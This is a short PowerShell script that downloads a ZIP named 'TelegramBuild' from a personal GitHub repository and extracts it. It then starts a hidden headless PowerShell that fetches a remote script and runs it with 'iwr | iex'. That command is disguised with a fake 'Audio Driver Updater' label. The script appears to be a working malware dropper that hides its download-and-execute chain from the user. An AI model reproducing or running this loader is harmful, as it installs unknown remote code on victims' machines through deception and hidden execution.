# --- Variables ---
$url = "https://github.com/waed69/n/raw/refs/heads/main/TelegramBuild.zip"
$downloadPath = "C:\Users\$env:USERNAME\Downloads\TelegramBuild.zip"
$extractPath = "C:\Users\$env:USERNAME\Downloads\TelegramBuild"  # Folder to unzip

# --- Download the ZIP file ---
Invoke-WebRequest $url -OutFile $downloadPath
Start-Sleep -Seconds 3

# --- Extract the ZIP file ---
Expand-Archive -Path $downloadPath -DestinationPath $extractPath -Force
Start-Sleep -Seconds 4

#run the next script
conhost.exe --headless powershell -Command "iwr https://raw.githubusercontent.com/waed69/Brabus/refs/heads/main/sleep.ps1 | iex; '# Audio Driver Updater 4.7X - (Build 2025.01.12)'"
